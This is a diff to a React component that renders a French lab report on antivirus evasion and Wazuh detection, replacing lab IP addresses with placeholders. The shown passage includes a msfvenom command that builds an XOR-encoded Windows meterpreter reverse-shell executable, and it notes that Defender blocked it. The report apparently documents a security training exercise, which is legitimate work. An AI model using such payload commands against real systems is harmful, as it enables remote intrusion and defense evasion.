@@ -6,7 +6,7 @@ export default function RapportEvasion() {
       <ReportHeader
         title="Évasion Antivirus & Détection Wazuh"
         subtitle="Chapitre 6, Module 4 — Paliers 1, 2 et 3 · MITRE T1562 (Impair Defenses)"
-        meta="23 juin 2026 · Kali 192.168.56.100 → Windows Server 2022 192.168.56.101 · Wazuh 4.12.0"
+        meta="23 juin 2026 · Kali [KALI] → Windows Server 2022 [SERVEUR] · Wazuh 4.12.0"
       />
 
       <H2>1. Objectif</H2>
@@ -18,7 +18,7 @@ export default function RapportEvasion() {
       </p>
 
       <H2>2. Palier 1 — Encodeur XOR msfvenom</H2>
-      <Cmd term="Kali">{`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.100 LPORT=4444 \\
+      <Cmd term="Kali">{`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[KALI] LPORT=4444 \\
   -e x64/xor_dynamic -i 10 -f exe -o /home/kali/evasion1_xor.exe`}</Cmd>
       <p>
         <b>Résultat :</b> Defender bloque via AMSI à l'exécution. Menace :{' '}
